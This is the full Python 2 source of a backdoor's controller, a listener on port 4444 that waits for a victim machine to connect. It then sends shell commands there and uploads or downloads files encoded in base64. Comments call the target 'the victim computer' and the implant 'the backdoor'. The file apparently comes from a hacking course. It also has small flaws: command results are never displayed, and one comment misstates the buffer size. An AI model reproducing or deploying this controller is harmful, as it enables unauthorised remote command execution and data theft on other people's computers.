#!usr/bin/python
import socket, json, base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)  # backlog specifies the number of connections to be queued before the system starts rejecting connections and
        # is set to zero in this case.
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept() #listener.accept() returns two values, connection is the socket object
        #used by the target computer to connect to us(the socket object created in the backdoor(target computer backdoor) and
        #address returns the address(IP and the port) of the victim computer
        print("[+] Got a connections from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.connection.recv(1024)) #the data will be receieved in packets of size 1024 Kb or 1Mb
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command) #we execute this command before actually checking for the exit command as we want this command to sent first to the target computer
        #as if we execute the if statement before sending this command to the target computer we will terminate our connection but the target computer will still go on
        #executing the backdoor and won't exit.

        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error" not in result:
                    self.write_file(command[1], result)

            except Exception:
                result = "[-] Error during command execution"


my_listener = Listener("10.0.2.15", 4444)
my_listener.run()